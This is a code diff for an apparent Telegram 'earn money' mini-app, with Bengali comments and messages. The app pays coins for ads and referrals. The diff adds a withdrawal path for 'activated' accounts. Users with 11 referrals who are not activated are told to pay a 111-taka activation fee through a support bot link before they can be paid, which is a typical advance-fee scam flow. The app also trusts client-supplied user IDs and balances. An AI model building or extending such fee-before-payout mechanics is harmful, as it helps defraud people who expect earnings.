@@ -140,7 +140,7 @@ const db = firebase.firestore();
 const tg = window.Telegram.WebApp;
 tg.ready(); tg.expand();
 const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "guest";
-let userBalance = 0, totalTasks = 0, totalRefers = 0, totalWatched = 0;
+let userBalance = 0, totalTasks = 0, totalRefers = 0, totalWatched = 0, isActive = false;
 
 async function loadAllData() {
     const userRef = db.collection('users').doc(userId);
@@ -151,6 +151,7 @@ async function loadAllData() {
         totalTasks = data.tasks || 0;
         totalRefers = data.refers || 0;
         totalWatched = data.totalWatched || 0;
+        isActive = data.is_active || false; // এখানে অ্যাকাউন্ট অ্যাক্টিভ আছে কিনা চেক হবে
     }
     document.getElementById('refer-link').innerText = "https://t.me/TakaInkam1626_bot?start=" + userId;
     updateUI();
@@ -213,20 +214,39 @@ async function watchRealAd() {
     }
 }
 
-function processWithdraw() {
+async function processWithdraw() {
     const amount = parseFloat(document.getElementById("withdraw-amount").value);
     const number = document.getElementById("withdraw-number").value;
-    const supportLink = "https://t.me/ks162699bot"; 
+    const method = document.getElementById("payment-method").value;
+    const supportLink = "https://t.me/as16269bot"; 
     
     if (!number || !amount) { tg.showAlert("সব তথ্য পূরণ করুন।"); return; }
     if (amount < 500) { tg.showAlert("ন্যূনতম ৫০০ কয়েন প্রয়োজন!"); return; }
     if (amount > userBalance) { tg.showAlert("পর্যাপ্ত ব্যালেন্স নেই!"); return; }
+    if (totalRefers < 11) { tg.showAlert("⚠️ রিডিম করতে ১১টি রেফার প্রয়োজন। বর্তমান রেফার: " + totalRefers + "টি।"); return; }
     
-    if (totalRefers < 11) {
-        tg.showAlert("⚠️ রিডিম করতে ১১টি রেফার প্রয়োজন। বর্তমান রেফার: " + totalRefers + "টি।");
+    // ১. ইউজার যদি অলরেডি অ্যাক্টিভ থাকে (ডেটাবেজে is_active: true থাকে)
+    if (isActive === true) {
+        // সরাসরি উইথড্র রিকোয়েস্ট ফায়ারবেস ডেটাবেজে জমা হবে
+        await db.collection('withdraw_requests').add({
+            userId: userId,
+            number: number,
+            amount: amount,
+            method: method,
+            status: "pending",
+            time: new Date()
+        });
+        
+        // ব্যালেন্স কেটে নেওয়া এবং আপডেট করা
+        userBalance -= amount;
+        await saveAllData();
+        updateUI();
+        
+        tg.showAlert("🎉 আপনার পেমেন্ট অনুরোধ সফলভাবে জমা হয়েছে! অ্যাডমিন ২৪ ঘণ্টার মধ্যে পেমেন্ট করে দেবে।");
         return;
     }
     
+    // ২. ইউজার যদি অ্যাক্টিভ না থাকে, তবে আগের মতো পপ-আপ দেখাবে ফি দেওয়ার জন্য
     tg.showPopup({
         title: 'পেমেন্ট রিকোয়েস্ট',
         message: 'আপনার ১১টি রেফার পূর্ণ হয়েছে। পেমেন্ট রিকোয়েস্ট পাঠানোর আগে ১১১ টাকা ফি দিয়ে অ্যাকাউন্ট অ্যাক্টিভ করুন।',
@@ -236,7 +256,7 @@ function processWithdraw() {
             tg.openLink(supportLink); 
         } else {
             let taka = (amount >= 1000) ? (amount / 1000) * 20 : (amount / 500) * 10;
-            tg.showAlert("আপনার " + amount + " কয়েন = " + taka + " টাকা। পেমেন্ট পেতে অবশ্যই অ্যাক্টিভেশন ফি প্রদান করুন।");
+            tg.showAlert("আপনার " + amount + " কয়েন = " + taka + " টাকা। পেমেন্ট পেতে অবশ্যই অ্যাকাউন্ট অ্যাক্টিভেশন ফি প্রদান করুন।");
         }
     });
 }
